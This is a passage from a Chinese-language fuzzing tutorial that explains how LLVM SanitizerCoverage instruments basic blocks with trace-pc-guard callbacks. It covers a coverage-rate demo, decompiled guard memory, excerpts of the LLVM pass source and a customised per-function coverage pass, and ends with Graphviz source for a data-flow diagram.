guard: 0x439bb0 1 PC 0x423b6c in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:6
guard: 0x439bb4 2 PC 0x423b98 in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:8:9
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$
</code></pre>
<h4 id="一个简单的代码覆盖率demo-1"><a class="header" href="#一个简单的代码覆盖率demo-1">一个简单的代码覆盖率Demo</a></h4>
<p>统计程序的代码覆盖率需要两个要素:<code>当前程序所有分支总数/执行过的程序路径总数</code>.对于当前程序所有分支总数的获取,我们可以直接通过<code>__sanitizer_cov_trace_pc_guard()</code>统计得到,那么当前程序所有分支总数怎么获取呢?我们发现LLVM还提供了Sanitizer-Coverage初始化函数<code>__sanitizer_cov_trace_pc_guard_init()</code>,来看看它的声明.</p>
<pre><code class="language-c">void __sanitizer_cov_trace_pc_guard_init(uint32_t *start, uint32_t *stop);
</code></pre>
<p>其中,start和stop参数分别指的是插桩数据开始到结束的指针,那么只需要计算<code>stop-start</code>即可获取当前程序所有分支总数.</p>
<pre><code class="language-c">uint32_t __sancov_current_all_guard_count = 0;

void __sanitizer_cov_trace_pc_guard_init(uint32_t *start,uint32_t *stop) {
    __sancov_current_all_guard_count = (stop - start);

    printf(&quot;Sanitizer All Coverage edges: 0x%X \n&quot;,__sancov_current_all_guard_count);
}
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ make &amp;&amp; ./test_case
clang -fsanitize-coverage=trace-pc-guard ./test_case.c -g -o ./test_case
./test_case.c:31:3: warning: implicit declaration of function '__sanitizer_symbolize_pc' is invalid in C99 [-Wimplicit-function-declaration]
  __sanitizer_symbolize_pc(PC, &quot;%p %F %L&quot;, PcDescr, sizeof(PcDescr));
  ^
1 warning generated.
Sanitizer All Coverage edges: 0x7
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$
</code></pre>
<p>稍微对代码进行修改,就可以完成一个简单的代码覆盖率统计Demo</p>
<pre><code class="language-c">uint32_t __sancov_current_all_guard_count = 0;
uint32_t __sancov_current_execute_guard_count = 0;

void __sanitizer_cov_trace_pc_guard(uint32_t *guard) {
  if (!*guard) return;
  void *PC = __builtin_return_address(0);
  char PcDescr[1024];

  __sanitizer_symbolize_pc(PC, &quot;%p %F %L&quot;, PcDescr, sizeof(PcDescr));
  printf(&quot;guard: %p %x PC %s\n&quot;, guard, *guard, PcDescr);
  ++__sancov_current_execute_guard_count;
}

void __sanitizer_cov_trace_pc_guard_init(uint32_t *start,uint32_t *stop) {
    int index = 0;

    for (uint32_t *p = start;p &lt; stop;++p)  //  为什么这里要需要for循环初始化呢,下一章会提到
        *p = ++index;

    __sancov_current_all_guard_count = (stop - start);

    printf(&quot;Sanitizer All Coverage edges: 0x%X \n&quot;,__sancov_current_all_guard_count);
}

int main() {
    if (rand() % 2)
        function1(rand() % 3);
    else
        function2();

    printf(&quot;Coverage Rate:%.2f% (%d/%d)\n&quot;,
        __sancov_current_execute_guard_count,
        __sancov_current_all_guard_count,
        ((float)__sancov_current_execute_guard_count/(float)__sancov_current_all_guard_count) * 100);

    return 0;
}
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ make &amp;&amp; ./test_case
clang -fsanitize-coverage=trace-pc-guard ./test_case.c -g -o ./test_case
Sanitizer All Coverage edges: 0x7
guard: 0x439bc0 5 PC 0x423ca6 in main /home/ubuntu/Desktop/instrument_note/./test_case.c:41
guard: 0x439bc4 6 PC 0x423cdb in main /home/ubuntu/Desktop/instrument_note/./test_case.c:43:19
guard: 0x439bb0 1 PC 0x423c0c in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:30
guard: 0x439bb4 2 PC 0x423c38 in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:32:9
Coverage Rate:57.14% (4/7)
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$
</code></pre>
<h4 id="深入探索sanitizer-coverage实现-1"><a class="header" href="#深入探索sanitizer-coverage实现-1">深入探索Sanitizer-Coverage实现</a></h4>
<p>前一章节中留下了一个疑问,如果有自行使用这段代码编译运行就会发现,为什么用户自定义函数<code>__sanitizer_cov_trace_pc_guard_init()</code>之后,<code>__sanitizer_cov_trace_pc_guard()</code>就没有任何程序执行输出了?为什么<code>__sanitizer_cov_trace_pc_guard_init()</code>对start和stop初始化之后就可以成功运行了?为了深入理解这个问题,我们需要逆向Sanitizer-Coverage编译后的二进制程序.</p>
<p>我们阅读默认版本的<code>__sanitizer_cov_trace_pc_guard_init()</code>代码:</p>
<pre><code class="language-c">//  默认版本()
unsigned __int64 __usercall _sanitizer_cov_trace_pc_guard_init@&lt;rax&gt;(unsigned __int64 result@&lt;rax&gt;, unsigned __int64 a2@&lt;rdi&gt;, __sancov *a3@&lt;rsi&gt;, __m128i a4@&lt;xmm1&gt;, __m128i a5@&lt;xmm8&gt;)
{
  //  省略很多代码
  v5 = (_DWORD *)a2;  //  start
  if ( *(_DWORD *)a2 )
    return result;
  v6 = (unsigned __int64)a3;  //  stop
  //  省略很多代码
  do
   {
    *v5 = ++v8;
    ++v5;
   }
  while ( (unsigned __int64)v5 &lt; v6 );
  //  省略很多代码
  return result;
}
</code></pre>
<p>初始化函数会对start和stop这块内存区域进行计数写入,再来看看这块内存的分布.</p>
<pre><code class="language-assembly">__sancov_guards:0000000000439BB0 ; ===========================================================================
__sancov_guards:0000000000439BB0
__sancov_guards:0000000000439BB0 ; Segment type: Pure data
__sancov_guards:0000000000439BB0 ; Segment permissions: Read/Write
__sancov_guards:0000000000439BB0 __sancov_guards segment dword public 'DATA' use64
__sancov_guards:0000000000439BB0                 assume cs:__sancov_guards
__sancov_guards:0000000000439BB0                 ;org 439BB0h
__sancov_guards:0000000000439BB0                 public __start___sancov_guards
__sancov_guards:0000000000439BB0 ; uint32_t _start___sancov_guards[3]
__sancov_guards:0000000000439BB0 __start___sancov_guards dd 0            ; start参数起始地址
__sancov_guards:0000000000439BB4                 db    0
__sancov_guards:0000000000439BB5                 db    0
__sancov_guards:0000000000439BB6                 db    0
__sancov_guards:0000000000439BB7                 db    0
__sancov_guards:0000000000439BB8                 db    0
__sancov_guards:0000000000439BB9                 db    0
__sancov_guards:0000000000439BBA                 db    0
__sancov_guards:0000000000439BBB                 db    0
__sancov_guards:0000000000439BBC ; uint32_t guard
__sancov_guards:0000000000439BBC guard           dd 0
__sancov_guards:0000000000439BC0 ; uint32_t dword_439BC0[3]
__sancov_guards:0000000000439BC0 dword_439BC0    dd 0
__sancov_guards:0000000000439BC0
__sancov_guards:0000000000439BC4                 db    0
__sancov_guards:0000000000439BC5                 db    0
__sancov_guards:0000000000439BC6                 db    0
__sancov_guards:0000000000439BC7                 db    0
__sancov_guards:0000000000439BC8                 db    0
__sancov_guards:0000000000439BC9                 db    0
__sancov_guards:0000000000439BCA                 db    0
__sancov_guards:0000000000439BCB                 db    0
__sancov_guards:0000000000439BCB __sancov_guards ends
__sancov_guards:0000000000439BCB
LOAD:0000000000439BCC ; stop结束地址
</code></pre>
<p>这样来看这块内存数据不太容易理解,我们再读一下funtion1()的反汇编代码.</p>
<pre><code class="language-c">int __cdecl function1(int a)
{
  int v2; // [rsp+Ch] [rbp-4h]

  _sanitizer_cov_trace_pc_guard(_start___sancov_guards);  //  从start[0]读取数据调用trace_pc_guard()
  if ( a == 1 )
  {
    _sanitizer_cov_trace_pc_guard(&amp;_start___sancov_guards[1]);  //  从start[1]读取数据调用trace_pc_guard()
    v2 = 0;
  }
  else
  {
    _sanitizer_cov_trace_pc_guard(&amp;_start___sancov_guards[2]);  //  从start[2]读取数据调用trace_pc_guard()
    v2 = 1;
  }
  return v2;
}

// 执行function1()后的输出如下:
// guard: 0x439bb0 1 PC 0x423c1c in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:31
// guard: 0x439bb4 2 PC 0x423c48 in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:33:9

</code></pre>
<p>对<code>function1()</code>的逆向和运行可以发现,start[0]-start[2]的内存数据是用于保存当前执行的分支ID数据.综上所述,Sanitizer-Coverage会创造一块专用的区段用于保存插桩分支ID信息,但是这块内存默认是空数据,所以才需要<code>__sanitizer_cov_trace_pc_guard_init</code>遍历生成ID写入这块内存,后续<code>__sanitizer_cov_trace_pc_guard()</code>就可以成功从这里读取到分支ID数据.理解这个细节之后,再回来阅读上面的自定义<code>__sanitizer_cov_trace_pc_guard_init()</code>容易明白意义何在了.</p>
<pre><code class="language-c">//  用户自定义版本
void __cdecl _sanitizer_cov_trace_pc_guard_init(uint32_t *start, uint32_t *stop)
{
  uint32_t *p; // [rsp+0h] [rbp-20h]
  int index; // [rsp+Ch] [rbp-14h]

  index = 0;
  for ( p = start; p &lt;= stop; ++p )  // 初始化分支ID表
    *p = ++index;
  _sancov_current_all_guard_count = stop - start;  // 计算所有程序分支总数
  printf(&quot;Sanitizer All Coverage edges: 0x%X \n&quot;, (unsigned int)(stop - start), p);
}
</code></pre>
<h4 id="llvm-pass-for-sanitizercoveragecpp实现细节-1"><a class="header" href="#llvm-pass-for-sanitizercoveragecpp实现细节-1">LLVM Pass for SanitizerCoverage.cpp实现细节</a></h4>
<p>了解Sanitizer-Coverage的运行原理后,现在从Clang编译的角度去探索它是怎么做实现的.SanitizerCoverage的实现代码在LLVM的<code>\llvm-project\llvm\lib\Transforms\Instrumentation\SanitizerCoverage.cpp</code>目录.在阅读插桩代码之前简短提示下LLVM的Pass(优化模块)运行过程,插桩时一般用到ModulePass和FunctionPass,如果对整个代码文件进行处理时,那就用到ModulePass对象;如果对所有函数都处理,那就用到FunctionPass.PassManager控制所有Pass的执行过程.</p>
<pre><code class="language-c++">class ModuleSanitizerCoverageLegacyPass : public ModulePass {
public:
  bool runOnModule(Module &amp;M) override {
    ModuleSanitizerCoverage ModuleSancov(Options, Allowlist.get(),
                                         Blocklist.get());
    // Allowlist/Blocklist由参数-fsanitize-coverage-allowlist/-fsanitize-coverage-blocklist指定函数列表,有些场景下会用到
    auto DTCallback = [this](Function &amp;F) -&gt; const DominatorTree * {
      return &amp;this-&gt;getAnalysis&lt;DominatorTreeWrapperPass&gt;(F).getDomTree();
    };
    auto PDTCallback = [this](Function &amp;F) -&gt; const PostDominatorTree * {
      return &amp;this-&gt;getAnalysis&lt;PostDominatorTreeWrapperPass&gt;(F)
                  .getPostDomTree();
    };
    return ModuleSancov.instrumentModule(M, DTCallback, PDTCallback);
  }
}
</code></pre>
<p>ModulePass执行时的入口点在<code>runOnModule()</code>中,这里主要是把相关的参数传递给<code>instrumentModule()</code>.</p>
<pre><code class="language-c++">bool ModuleSanitizerCoverage::instrumentModule(
    Module &amp;M, DomTreeCallback DTCallback, PostDomTreeCallback PDTCallback) {
  if (Options.CoverageType == SanitizerCoverageOptions::SCK_None)
    return false;
  if (Allowlist &amp;&amp;
      !Allowlist-&gt;inSection(&quot;coverage&quot;, &quot;src&quot;, M.getSourceFileName()))
    return false;
  if (Blocklist &amp;&amp;
      Blocklist-&gt;inSection(&quot;coverage&quot;, &quot;src&quot;, M.getSourceFileName()))
    return false;
  C = &amp;(M.getContext());
  DL = &amp;M.getDataLayout();
  CurModule = &amp;M;
  CurModuleUniqueId = getUniqueModuleId(CurModule);
  TargetTriple = Triple(M.getTargetTriple());
  FunctionGuardArray = nullptr;
  Function8bitCounterArray = nullptr;
  FunctionBoolArray = nullptr;
  FunctionPCsArray = nullptr;
  IntptrTy = Type::getIntNTy(*C, DL-&gt;getPointerSizeInBits());
  IntptrPtrTy = PointerType::getUnqual(IntptrTy);
  Type *VoidTy = Type::getVoidTy(*C);
  IRBuilder&lt;&gt; IRB(*C);
  Int64PtrTy = PointerType::getUnqual(IRB.getInt64Ty());
  Int32PtrTy = PointerType::getUnqual(IRB.getInt32Ty());
  Int8PtrTy = PointerType::getUnqual(IRB.getInt8Ty());
  Int1PtrTy = PointerType::getUnqual(IRB.getInt1Ty());
  Int64Ty = IRB.getInt64Ty();
  Int32Ty = IRB.getInt32Ty();
  Int16Ty = IRB.getInt16Ty();
  Int8Ty = IRB.getInt8Ty();
  Int1Ty = IRB.getInt1Ty();

  SanCovTracePCIndir =
      M.getOrInsertFunction(SanCovTracePCIndirName, VoidTy, IntptrTy);
  // Make sure smaller parameters are zero-extended to i64 as required by the
  // x86_64 ABI.
  AttributeList SanCovTraceCmpZeroExtAL;
  if (TargetTriple.getArch() == Triple::x86_64) {
    SanCovTraceCmpZeroExtAL =
        SanCovTraceCmpZeroExtAL.addParamAttribute(*C, 0, Attribute::ZExt);
    SanCovTraceCmpZeroExtAL =
        SanCovTraceCmpZeroExtAL.addParamAttribute(*C, 1, Attribute::ZExt);
  }

  SanCovTraceCmpFunction[0] =
      M.getOrInsertFunction(SanCovTraceCmp1, SanCovTraceCmpZeroExtAL, VoidTy,
                            IRB.getInt8Ty(), IRB.getInt8Ty());
  SanCovTraceCmpFunction[1] =
      M.getOrInsertFunction(SanCovTraceCmp2, SanCovTraceCmpZeroExtAL, VoidTy,
                            IRB.getInt16Ty(), IRB.getInt16Ty());
  SanCovTraceCmpFunction[2] =
      M.getOrInsertFunction(SanCovTraceCmp4, SanCovTraceCmpZeroExtAL, VoidTy,
                            IRB.getInt32Ty(), IRB.getInt32Ty());
  SanCovTraceCmpFunction[3] =
      M.getOrInsertFunction(SanCovTraceCmp8, VoidTy, Int64Ty, Int64Ty);

  SanCovTraceConstCmpFunction[0] = M.getOrInsertFunction(
      SanCovTraceConstCmp1, SanCovTraceCmpZeroExtAL, VoidTy, Int8Ty, Int8Ty);
  SanCovTraceConstCmpFunction[1] = M.getOrInsertFunction(
      SanCovTraceConstCmp2, SanCovTraceCmpZeroExtAL, VoidTy, Int16Ty, Int16Ty);
  SanCovTraceConstCmpFunction[2] = M.getOrInsertFunction(
      SanCovTraceConstCmp4, SanCovTraceCmpZeroExtAL, VoidTy, Int32Ty, Int32Ty);
  SanCovTraceConstCmpFunction[3] =
      M.getOrInsertFunction(SanCovTraceConstCmp8, VoidTy, Int64Ty, Int64Ty);

  {
    AttributeList AL;
    if (TargetTriple.getArch() == Triple::x86_64)
      AL = AL.addParamAttribute(*C, 0, Attribute::ZExt);
    SanCovTraceDivFunction[0] =
        M.getOrInsertFunction(SanCovTraceDiv4, AL, VoidTy, IRB.getInt32Ty());
  }
  SanCovTraceDivFunction[1] =
      M.getOrInsertFunction(SanCovTraceDiv8, VoidTy, Int64Ty);
  SanCovTraceGepFunction =
      M.getOrInsertFunction(SanCovTraceGep, VoidTy, IntptrTy);
  SanCovTraceSwitchFunction =
      M.getOrInsertFunction(SanCovTraceSwitchName, VoidTy, Int64Ty, Int64PtrTy);

  Constant *SanCovLowestStackConstant =
      M.getOrInsertGlobal(SanCovLowestStackName, IntptrTy);
  SanCovLowestStack = dyn_cast&lt;GlobalVariable&gt;(SanCovLowestStackConstant);
  if (!SanCovLowestStack) {
    C-&gt;emitError(StringRef(&quot;'&quot;) + SanCovLowestStackName +
                 &quot;' should not be declared by the user&quot;);
    return true;
  }
  SanCovLowestStack-&gt;setThreadLocalMode(
      GlobalValue::ThreadLocalMode::InitialExecTLSModel);
  if (Options.StackDepth &amp;&amp; !SanCovLowestStack-&gt;isDeclaration())
    SanCovLowestStack-&gt;setInitializer(Constant::getAllOnesValue(IntptrTy));

  SanCovTracePC = M.getOrInsertFunction(SanCovTracePCName, VoidTy);
  SanCovTracePCGuard =
      M.getOrInsertFunction(SanCovTracePCGuardName, VoidTy, Int32PtrTy);

/*

static const char *const SanCovTracePCName = &quot;__sanitizer_cov_trace_pc&quot;;
static const char *const SanCovTraceCmp1 = &quot;__sanitizer_cov_trace_cmp1&quot;;
static const char *const SanCovTraceCmp2 = &quot;__sanitizer_cov_trace_cmp2&quot;;
static const char *const SanCovTraceCmp4 = &quot;__sanitizer_cov_trace_cmp4&quot;;
static const char *const SanCovTraceCmp8 = &quot;__sanitizer_cov_trace_cmp8&quot;;

*/
</code></pre>
<p>上面的逻辑代码逻辑主要就是从LLVMContext中获取常见变量类型和根据函数名获取SanitizerCoverage的内部函数以初始化,然后就遍历Module中的所有Function,开始插桩.</p>
<pre><code class="language-c++">  for (auto &amp;F : M)
    instrumentFunction(F, DTCallback, PDTCallback);
</code></pre>
<pre><code class="language-c++">
void ModuleSanitizerCoverage::instrumentFunction(
    Function &amp;F, DomTreeCallback DTCallback, PostDomTreeCallback PDTCallback) {
  if (F.empty())
    return;
  if (F.getName().find(&quot;.module_ctor&quot;) != std::string::npos)
    return; // Should not instrument sanitizer init functions.
  if (F.getName().startswith(&quot;__sanitizer_&quot;))
    return; // Don't instrument __sanitizer_* callbacks.
  // 省略很多不插桩的逻辑

  SmallVector&lt;Instruction *, 8&gt; IndirCalls;
  SmallVector&lt;BasicBlock *, 16&gt; BlocksToInstrument;
  SmallVector&lt;Instruction *, 8&gt; CmpTraceTargets;
  SmallVector&lt;Instruction *, 8&gt; SwitchTraceTargets;
  SmallVector&lt;BinaryOperator *, 8&gt; DivTraceTargets;
  SmallVector&lt;GetElementPtrInst *, 8&gt; GepTraceTargets;
  // 这些变量分别用于不同参数的插桩方法
  // -fsanitize-coverage=trace-pc-guard,indirect-calls,trace-cmp,trace-div,trace-gep

  for (auto &amp;BB : F) {  // 遍历当前函数所有BasicBlock代码块
    if (shouldInstrumentBlock(F, &amp;BB, DT, PDT, Options))
      BlocksToInstrument.push_back(&amp;BB);  // 记录所有可以进行插桩的BasicBlock
    for (auto &amp;Inst : BB) {  // 遍历BasicBlock中所有指令
      if (Options.IndirectCalls) {  // 如果启用参数-fsanitize-coverage=indirect-calls
        CallBase *CB = dyn_cast&lt;CallBase&gt;(&amp;Inst);
        if (CB &amp;&amp; !CB-&gt;getCalledFunction())  // 如果是Call指令,dyn_case会返回非NULL指针
          IndirCalls.push_back(&amp;Inst);  // 记录所有Call指令
      }
      if (Options.TraceCmp) {
        if (ICmpInst *CMP = dyn_cast&lt;ICmpInst&gt;(&amp;Inst))
          if (IsInterestingCmp(CMP, DT, Options))
            CmpTraceTargets.push_back(&amp;Inst);
        if (isa&lt;SwitchInst&gt;(&amp;Inst))
          SwitchTraceTargets.push_back(&amp;Inst);
      }
      if (Options.TraceDiv)
        if (BinaryOperator *BO = dyn_cast&lt;BinaryOperator&gt;(&amp;Inst))
          if (BO-&gt;getOpcode() == Instruction::SDiv ||
              BO-&gt;getOpcode() == Instruction::UDiv)
            DivTraceTargets.push_back(BO);
      if (Options.TraceGep)
        if (GetElementPtrInst *GEP = dyn_cast&lt;GetElementPtrInst&gt;(&amp;Inst))
          GepTraceTargets.push_back(GEP);
      if (Options.StackDepth)
        if (isa&lt;InvokeInst&gt;(Inst) ||
            (isa&lt;CallInst&gt;(Inst) &amp;&amp; !isa&lt;IntrinsicInst&gt;(Inst)))
          IsLeafFunc = false;
    }
  }

  // 经过多次遍历之后获取到很多BasicBlock和Inst,然后分别使用不同方法进行插桩
  InjectCoverage(F, BlocksToInstrument, IsLeafFunc);
  InjectCoverageForIndirectCalls(F, IndirCalls);
  InjectTraceForCmp(F, CmpTraceTargets);
  InjectTraceForSwitch(F, SwitchTraceTargets);
  InjectTraceForDiv(F, DivTraceTargets);
  InjectTraceForGep(F, GepTraceTargets);
}
</code></pre>
<p>由于文章篇幅关系,在此就只介绍<code>InjectCoverage()</code>的插桩逻辑,简单地说,接下来<code>InjectCoverage()</code>会直接根据前面的筛选出来的BlocksToInstrument的入口处插入对<code>__sanitizer_cov_trace_pc_guard()</code>函数调用.</p>
<pre><code class="language-c++">bool ModuleSanitizerCoverage::InjectCoverage(Function &amp;F, ArrayRef&lt;BasicBlock *&gt; AllBlocks,bool IsLeafFunc) {
  if (AllBlocks.empty()) return false;
    CreateFunctionLocalArrays(F, AllBlocks);  // 这里就是创建SantizerCoverage的分支ID记录内存区域
  for (size_t i = 0, N = AllBlocks.size(); i &lt; N; i++)
    InjectCoverageAtBlock(F, *AllBlocks[i], i, IsLeafFunc);  // 遍历所有BasicBlock
  return true;
}

void ModuleSanitizerCoverage::CreateFunctionLocalArrays(
    Function &amp;F, ArrayRef&lt;BasicBlock *&gt; AllBlocks) {
  if (Options.TracePCGuard)
    FunctionGuardArray = CreateFunctionLocalArrayInSection(
        AllBlocks.size(), F, Int32Ty, SanCovGuardsSectionName);  // 记住这个变量,这里的意思是根据当前获取到的所有BasicBlock的数量去创建一个整数数组,用于收集TracePCGuard插桩方法的分支ID记录内存区域
  // 省略其它代码
}

void ModuleSanitizerCoverage::InjectCoverageAtBlock(Function &amp;F, BasicBlock &amp;BB,size_t Idx,bool IsLeafFunc) {
  BasicBlock::iterator IP = BB.getFirstInsertionPt();
  bool IsEntryBB = &amp;BB == &amp;F.getEntryBlock();
  DebugLoc EntryLoc;
  if (IsEntryBB) {
    if (auto SP = F.getSubprogram())
      EntryLoc = DebugLoc::get(SP-&gt;getScopeLine(), 0, SP);
    // Keep static allocas and llvm.localescape calls in the entry block.  Even
    // if we aren't splitting the block, it's nice for allocas to be before
    // calls.
    IP = PrepareToSplitEntryBlock(BB, IP);
  } else {
    EntryLoc = IP-&gt;getDebugLoc();
  }

  IRBuilder&lt;&gt; IRB(&amp;*IP);  // 前面一通操作是为了获取BasicBlock的第一条指令
  // 省略其它代码
  if (Options.TracePCGuard) {
    auto GuardPtr = IRB.CreateIntToPtr(
        IRB.CreateAdd(IRB.CreatePointerCast(FunctionGuardArray, IntptrTy),
                      ConstantInt::get(IntptrTy, Idx * 4)),
        Int32PtrTy);  // 创建整数指针引用,等价于FunctionGuardArray[Idx]
    IRB.CreateCall(SanCovTracePCGuard, GuardPtr)-&gt;setCannotMerge();  // 使用前面创建的引用来创建函数调用,等价于__sanitizer_cov_trace_pc_guard(FunctionGuardArray[Idx]);
  }
  // 省略其它代码
}
</code></pre>
<p>完成所有插桩之后,最后一步就是程序启动时插入对<code>__sanitizer_cov_trace_pc_guard_init()</code>函数的调用.</p>
<pre><code class="language-c++">  Function *Ctor = nullptr;

  if (FunctionGuardArray)
    Ctor = CreateInitCallsForSections(M, SanCovModuleCtorTracePcGuardName,
                                      SanCovTracePCGuardInitName, Int32PtrTy,
                                      SanCovGuardsSectionName);
</code></pre>
<p>细心的读者可能会想起还有个细节没有提到,那就是LLVM默认的<code>__sanitizer_cov_trace_pc_guard_init()</code>函数再哪个地方声明引入的呢?其实这些LLVM内置的函数都在<code>Compiler-RT</code>中实现(后面ASAN会用到),代码目录在<code>\llvm-project\compiler-rt\lib\sanitizer_common</code>.</p>
<pre><code class="language-c++">// sanitizer_coverage_fuchsia.cpp

SANITIZER_INTERFACE_WEAK_DEF(void, __sanitizer_cov_trace_pc_guard_init,
                             u32 *start, u32 *end) {  // LLVM默认__sanitizer_cov_trace_pc_guard_init()函数实现代码
  if (start == end || *start)
    return;
  __sancov::pc_guard_controller.InitTracePcGuard(start, end);
}

void InitTracePcGuard(u32 *start, u32 *end) {  // 初始化分支ID内存区域
  if (end &gt; start &amp;&amp; *start == 0 &amp;&amp; common_flags()-&gt;coverage) {
    // Complete the setup before filling in any guards with indices.
    // This avoids the possibility of code called from Setup reentering
    // TracePcGuard.
    u32 idx = Setup(end - start);
    for (u32 *p = start; p &lt; end; ++p) {
      *p = idx++;
    }
  }
}
</code></pre>
<h4 id="定制sanitizercoverage-1"><a class="header" href="#定制sanitizercoverage-1">定制SanitizerCoverage</a></h4>
<p>笔者在实现Fuzzer的时候,遇到了个真实的场景.在使用二次开发或者针对某个模块做单元测试时,往往这个模块的代码只占程序全部代码的很小的部分.举个例子,如果模块代码只占全部代码的5%,但是Fuzzer的测试用例可以覆盖这个模块的80%代码,那么最后统计代码覆盖率是使用5%还是80%呢?笔者认为应该是80%的代码覆盖率才是最接近真实的,所以我的思路是:根据执行过的每个函数的总分支数除以每个函数执行过的分支数即可,示例图如下:</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/1.png" alt="" /></p>
<p>最终的结果是</p>
<pre><code>(6 + 2 + 1 + 1) / (10 + 4 + 1 + 2) = 58.82%
</code></pre>
<p>现在遇到的难题有两个:</p>
<ul>
<li>
<p>每个函数的分支总数怎么获取呢?</p>
</li>
<li>
<p>插桩只能获取到插桩处的PC地址,怎么样知道我们当前执行到了哪个函数地址?</p>
<p>为了实现这个功能,需要对原有的插桩代码做一些简短的修改,改动如下:</p>
</li>
</ul>
<pre><code class="language-c++">bool ModuleSanitizerCoverage::instrumentModule() {
   // ...
  SanCovTracePCGuard =
      M.getOrInsertFunction(SanCovTracePCGuardName, VoidTy, Int32PtrTy, Int32PtrTy, Int32PtrTy);  // 修改__sanitizer_cov_trace_pc_guard()的调用声明,改成__sanitizer_cov_trace_pc_guard(int,int,int)
   // ...
}

bool ModuleSanitizerCoverage::InjectCoverage(Function &amp;F,ArrayRef&lt;BasicBlock *&gt; AllBlocks,bool IsLeafFunc) {
  if (AllBlocks.empty()) return false;
  CreateFunctionLocalArrays(F, AllBlocks);
  for (size_t i = 0, N = AllBlocks.size(); i &lt; N; i++)
    InjectCoverageAtBlock(F, *AllBlocks[i], i, IsLeafFunc, N);  // 遍历出来的BasicBlock总数其实就是当前函数的所有分支
  return true;
}

void ModuleSanitizerCoverage::InjectCoverageAtBlock(Function &amp;F, BasicBlock &amp;BB,size_t Idx,bool IsLeafFunc,size_t EdgeCount) {  // 新增参数EdgeCount
   // ...
  if (Options.TracePCGuard) {
    std::vector&lt;Value*&gt; SanCovTracePCGuardArgumentList;  // 创建参数调用列表
    auto GuardPtr = IRB.CreateIntToPtr(
        IRB.CreateAdd(IRB.CreatePointerCast(FunctionGuardArray, IntptrTy),
                      ConstantInt::get(IntptrTy, Idx * 4)),
        Int32PtrTy);  // 从FunctionGuardArray中获取到的分支ID数据
    auto FunctionPtr = IRB.CreateIntToPtr(IRB.CreatePointerCast(static_cast&lt;Value*&gt;(&amp;F), IntptrTy),Int32PtrTy);  // 获取当前函数地址,转换为指针传递
    Constant* ConstFunctionInsideEdgeCount = ConstantInt::get(IntptrTy, EdgeCount);  //  获取当前函数分支总数,作为int值传递

    SanCovTracePCGuardArgumentList.push_back(GuardPtr);
    SanCovTracePCGuardArgumentList.push_back(ConstFunctionInsideEdgeCount);
    SanCovTracePCGuardArgumentList.push_back(FunctionPtr);

    IRB.CreateCall(SanCovTracePCGuard, static_cast&lt;ArrayRef&lt;Value *&gt;&gt;(SanCovTracePCGuardArgumentList))-&gt;setCannotMerge();
  }
   // ...
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="14-libfuzzer-asan"><a class="header" href="#14-libfuzzer-asan">14. Libfuzzer Asan</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="141-静态程序分析原理"><a class="header" href="#141-静态程序分析原理">14.1. 静态程序分析原理</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="142-libfuzzer-asan"><a class="header" href="#142-libfuzzer-asan">14.2. Libfuzzer Asan</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="必备工具-9"><a class="header" href="#必备工具-9">必备工具</a></h2>
<p>Python ,cparser (https://github.com/tscosine/cparser/)</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="附录一----各图的graphiz-生成代码-1"><a class="header" href="#附录一----各图的graphiz-生成代码-1">附录一 -- 各图的Graphiz 生成代码</a></h2>
<p>在线生成Graphiz . http://dreampuf.github.io/GraphvizOnline/</p>
<pre><code class="language-txt">digraph G {

  function_buffer_resolver[shape=box,label=&quot;function_buffer_resolver&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
  buffer[label=&quot;argument_buffer&quot;];
  buffer_length[label=&quot;variant_buffer_length&quot;];
  buffer_type[label=&quot;condition_buffer_type&quot;];
  const_message_type_hello[label=&quot;const_message_type_hello&quot;];
  const_message_type_execute[label=&quot;const_message_type_execute&quot;];
  const_message_type_data[label=&quot;const_message_type_data&quot;];
  command_buffer[label=&quot;variant_command_buffer&quot;];
  function_execute_command[shape=box,label=&quot;function_execute_command&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
  function_decrypt_data[shape=box,label=&quot;function_decrypt_data&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];

  function_buffer_resolver-&gt;buffer [label=&quot;Function Argument &quot;,style=bold,color=green];

  buffer-&gt;buffer_length [label=&quot;Access buffer[0] &quot;,style=bold,color=violet];
  buffer-&gt;buffer_type [label=&quot;Access buffer[1] &quot;,style=bold,color=violet];

  buffer_type-&gt;const_message_type_hello [label=&quot;Check Condition &quot;,style=bold];
  buffer_type-&gt;const_message_type_execute [label=&quot;Check Condition &quot;,style=bold];
  buffer_type-&gt;const_message_type_data [label=&quot;Check Condition &quot;,style=bold];

  buffer_length-&gt;command_buffer [label=&quot;Alloc memory&quot;,style=bold,color=violet];
  command_buffer-&gt;command_buffer [label=&quot;memset zero&quot;,style=bold,color=blue];
  buffer-&gt;command_buffer [label=&quot;memcpy from buffer&quot;,style=bold,color=violet];

  command_buffer-&gt;function_execute_command [label=&quot;Call function&quot;,style=bold,color=red];
  buffer-&gt;function_decrypt_data [label=&quot;Call function&quot;,style=bold,color=red];

}
</code></pre>
<pre><code class="language-txt">digraph G {

    function_buffer_resolver[shape=box,label=&quot;function_buffer_resolver&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
    buffer[label=&quot;argument_buffer&quot;];
    command[label=&quot;argument_buffer&quot;];
    command_buffer[label=&quot;variant_command_buffer&quot;];
    function_execute_command[shape=box,label=&quot;function_execute_command&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];

